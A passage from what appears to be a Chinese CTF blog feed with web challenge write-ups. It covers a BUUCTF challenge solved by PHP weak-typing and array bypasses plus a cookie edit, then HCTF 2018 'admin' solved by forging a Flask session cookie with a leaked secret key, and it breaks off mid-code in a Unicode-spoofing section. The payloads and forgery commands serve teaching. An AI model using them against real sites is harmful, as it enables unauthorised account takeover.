punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"password can't be number&lt;/br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Password Right!&lt;/br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/375d2595c84d086e942ef033069167a4.png"></p><p>并且分析图片，得到以下信息</p><p>需要传入<code>money=100000000</code>和<code>password=404</code>并且password不能被检查为数字，还需要是CUIT的学生</p><p><code>password==404</code> 用到php的弱类型，<code>password=404a</code>即可绕过</p><p>CUIT的学生POST参数没说，可能在报文的头里面，抓包看看</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">user=0</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>果然是带cookie的，将cookie的值修改为1（都行）</p><p>构造payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">password<span class="token operator">=</span><span class="token number">404</span>a<span class="token operator">&amp;</span>money<span class="token operator">=</span><span class="token number">100000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/a0a4b9f2a114e466e5c70a8718a15b1b.png"></p><p>too long !!!!</p><p>应该是strcmp函数检测到了长度</p><p>money[]绕过</p><p>最终payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">password<span class="token operator">=</span><span class="token number">404</span>a<span class="token operator">&amp;</span>money<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">100000000</span>cookie<span class="token punctuation">:</span>user<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/fdbbce3df30ae8e9f07240a52c37e843.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF_2018 admin</title>
      <link href="/2021/03/27/hctf-2018-admin/"/>
      <url>/2021/03/27/hctf-2018-admin/</url>
      
        <content type="html"><![CDATA[<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>进入页面，弱密码登录竟然成功了，得到了flag</p><p>还是看看这道题的考点</p><p>首页源代码中<code>&lt;!-- you are not admin --&gt;</code></p><p>想试试二次注入好像不行</p><p>随便注册一个账号登录</p><p>登录后<code>post</code>里面试一下xss，也不行</p><p>那就<code>change password</code>得到<code>&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</code></p><p>下载，好像是源码，python我也不太懂</p><p>接下来参考别人的wp</p><h4 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h4><p>123，哈哈</p><h3 id="flask-session伪造"><a href="#flask-session伪造" class="headerlink" title="flask session伪造"></a>flask session伪造</h3><p><code>index.html</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">{% include('header.html') %}{% if current_user.is_authenticated %}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Hello {{ session['name'] }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>{% endif %}{% if current_user.is_authenticated and session['name'] == 'admin' %}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>hctf{xxxxxxxxx}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>{% endif %}<span class="token comment">&lt;!-- you are not admin --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Welcome to hctf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>{% include('footer.html') %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>{% if current_user.is_authenticated and session['name'] == 'admin' %}</code></p><p>这说的是传入的<code>seesion</code>=<code>admin</code>就会执行后面的，意思差不都是登录admin，显示flag</p><p><code>routes.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> session<span class="token punctuation">,</span> make_response<span class="token keyword">from</span> flask_login <span class="token keyword">import</span> logout_user<span class="token punctuation">,</span> LoginManager<span class="token punctuation">,</span> current_user<span class="token punctuation">,</span> login_user<span class="token keyword">from</span> app <span class="token keyword">import</span> app<span class="token punctuation">,</span> db<span class="token keyword">from</span> config <span class="token keyword">import</span> Config<span class="token keyword">from</span> app<span class="token punctuation">.</span>models <span class="token keyword">import</span> User<span class="token keyword">from</span> forms <span class="token keyword">import</span> RegisterForm<span class="token punctuation">,</span> LoginForm<span class="token punctuation">,</span> NewpasswordForm<span class="token keyword">from</span> twisted<span class="token punctuation">.</span>words<span class="token punctuation">.</span>protocols<span class="token punctuation">.</span>jabber<span class="token punctuation">.</span>xmpp_stringprep <span class="token keyword">import</span> nodeprep<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token keyword">from</span> code <span class="token keyword">import</span> get_verify_code<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/code'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    image<span class="token punctuation">,</span> code <span class="token operator">=</span> get_verify_code<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 图片以二进制形式写入</span>    buf <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>    image<span class="token punctuation">.</span>save<span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">'jpeg'</span><span class="token punctuation">)</span>    buf_str <span class="token operator">=</span> buf<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 把buf_str作为response返回前端，并设置首部字段</span>    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>buf_str<span class="token punctuation">)</span>    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/gif'</span>    <span class="token comment"># 将验证码字符串储存在session中</span>    session<span class="token punctuation">[</span><span class="token string">'image'</span><span class="token punctuation">]</span> <span class="token operator">=</span> code    <span class="token keyword">return</span> response<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'hctf'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> form<span class="token punctuation">.</span>verify_code<span class="token punctuation">.</span>data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Wrong verify code.'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span>        <span class="token keyword">if</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username <span class="token operator">=</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'The username has been registered'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'register successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> name        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> <span class="token keyword">not</span> user<span class="token punctuation">.</span>check_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Invalid username or password'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        login_user<span class="token punctuation">(</span>user<span class="token punctuation">,</span> remember<span class="token operator">=</span>form<span class="token punctuation">.</span>remember_me<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'login'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    logout_user<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>newpassword<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'change successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'change.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'change'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/edit'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>                flash<span class="token punctuation">(</span><span class="token string">'post successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'edit.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'edit'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page_not_found</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>    title <span class="token operator">=</span> <span class="token builtin">unicode</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>    message <span class="token operator">=</span> error<span class="token punctuation">.</span>description    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'errors.html'</span><span class="token punctuation">,</span> title<span class="token operator">=</span>title<span class="token punctuation">,</span> message<span class="token operator">=</span>message<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">return</span> username<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flask是用python写的web框架，session以cookie形式存在客户端</p><p>接下来解码，再伪造session</p><p><img src="https://images.dadream.eu.org/images/2024/07/eed00b048156fdebb04153288475cbd7.png"></p><p>拿到session</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">session：.eJxFUM9rwjAU_lfGO3toQ70IXkatOHgvVNKGl4s4rbZp4qBV1Ij_-4Ib2_n7_T1gcxiasYXZebg0E9h0e5g94O0TZoCWU6nLK_rqjp4DWbKsyzvZPpOKnNRFT2IhZF5luOSb8ZyQLjyFtpXKucgLMi981AQMq4zVUVDeT03Od7YrQdZZ4xeB9fqHvzQew75F9eHJVkEuyykpvKEvE6ljdlhELSYm7wWHdWvUTlDYd6iqOTwnsBuHw-b81Tenvwmka4e6cLFChmqXGBXtremkNg5trGPfLfuiN7ZMWVWJ0euOr_OXXee3x-b_DFFn9S9y2voIQAoTuIzN8PoM0gSe3-wTbLg.YGAkfw.j_uEzvi-2vEKxpp7Xzgj-Iyw1bc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>还需要SECRET_KEY</p><p><code>config.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">Config</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    SECRET_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">'ckj123'</span>    SQLALCHEMY_DATABASE_URI <span class="token operator">=</span> <span class="token string">'mysql+pymysql://root:adsl1234@db:3306/test'</span>    SQLALCHEMY_TRACK_MODIFICATIONS <span class="token operator">=</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">SECRET_KEY</span><span class="token punctuation">:</span><span class="token header-value">ckj123</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>脚本：<a href="https://github.com/noraj/flask-session-cookie-manager">noraj/flask-session-cookie-manager: Flask Session Cookie Decoder/Encoder</a></p><p>跑一下，得到</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python flask_session_cookie_manager3<span class="token punctuation">.</span>py decode <span class="token operator">-</span>s ckj123 <span class="token operator">-</span>c <span class="token punctuation">.</span>eJxFUMFqwkAQ_ZUyZw9GzSXgQUgTFGZCwsZl9yLWxmQnuylERV3x37u10B4ew_B4b968B<span class="token operator">-</span>yOY3PqIDmPl2YCO_MJyQPePiAB5PJOEqeK3<span class="token operator">-</span>MiVbGSG4Mz6khsGblzStYzdFWHYhX_TO20wYBCVJbk<span class="token operator">-</span>oq5iimtWIn<span class="token operator">-</span>hrwOaO_kNlaJ4CMzq7iOtMuc8ngrpO606KyWlS0kOeJyXqSrK84yR6maY54Z8kEXNMQHrzjcyMPubY<span class="token operator">-</span><span class="token operator">-</span>XMJzAofTeNydv_pm<span class="token operator">-</span>HuB0nqBvJoG2UJLddOcGS23PabWkNQOfe9JtPcir2NiHaJlFsvly864fdv8lzFsBt3<span class="token operator">-</span>MsPeBQIimMDl1IyvziCawvMb0RFtXA<span class="token punctuation">.</span>YGBYaw<span class="token punctuation">.</span>SFJ0fvQ_rtos<span class="token operator">-</span>TSz52cCzIIkQVY<span class="token punctuation">{</span><span class="token string">'_fresh'</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token string">'_id'</span><span class="token punctuation">:</span> <span class="token string">b'2425c4b19869abb3ca55c28fae62da1092daffb2fb94e5b00f944ca912212826bea2b1aeb55fafc319fae8eede9cf6478003af4670ab72b255673b4e4bb39d34'</span><span class="token punctuation">,</span> <span class="token string">'csrf_token'</span><span class="token punctuation">:</span> <span class="token string">b'458204258ef1f1beed09b5ff3935828e966ea1e1'</span><span class="token punctuation">,</span> <span class="token string">'image'</span><span class="token punctuation">:</span> <span class="token string">b'2rgf'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'user_id'</span><span class="token punctuation">:</span> <span class="token string">'10'</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将<code>name</code>的值改为<code>admin</code>,编码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python flask3<span class="token punctuation">.</span>py encode <span class="token operator">-</span>s ckj123 <span class="token operator">-</span>t <span class="token string">"{'_fresh': True, '_id': b'2425c4b19869abb3ca55c28fae62da1092daffb2fb94e5b00f944ca912212826bea2b1aeb55fafc319fae8eede9cf6478003af4670ab72b255673b4e4bb39d34', 'csrf_token': b'458204258ef1f1beed09b5ff3935828e966ea1e1', 'image': b'2rgf', 'name': 'admin', 'user_id': '10'}"</span><span class="token punctuation">.</span>eJxFUMuKwkAQ_JWlzx7iIxfBg5BNUOgOCROHmYv4iMl0ZrIQFXXEf99ZF3YPRdMUVV1dT9iehvrcwvwyXOsRbM0R5k_42MMckIsHSYwUf8Z5omIl1wYn1JLYMHLrlKwm6MoWxTL<span class="token operator">-</span>mdppgwG5KC3J1Q0zFVNSshLdHXkV0DzIra0SwUemVnE11i51yuM9l7rVorValjaX5IiLaZ4sbzhJHSVqillqyAdd0BAfvOJwIwu7tx36YgGvERzOw2l7<span class="token operator">-</span>erq_u8FSqoZ8jIKspmW6q45NVpuOkysIakd<span class="token operator">-</span>s6TaB55VsXEOkRLLRaLt51xu6b<span class="token operator">-</span>L6Nf97r5ZfqdCwTsjs70MILruR7evcE4gtc3l5pvNA<span class="token punctuation">.</span>YGBhyg<span class="token punctuation">.</span>8mFsYTGotorfD6H7bsHdSTnxKQ4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后用burp抓包，传入修改的session，得到flag</p><p><img src="https://images.dadream.eu.org/images/2024/07/2da335133cf210becc8dd391024b9652.png"></p><h4 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h4><p>利用解码机制，传入一个非预期的值得到预期的结果</p><p>引用上面<code>routes.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> form<span class="token punctuation">.</span>verify_code<span class="token punctuation">.</span>data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Wrong verify code.'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span>        <span class="token keyword">if</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username <span class="token operator">=</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'The username has been registered'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     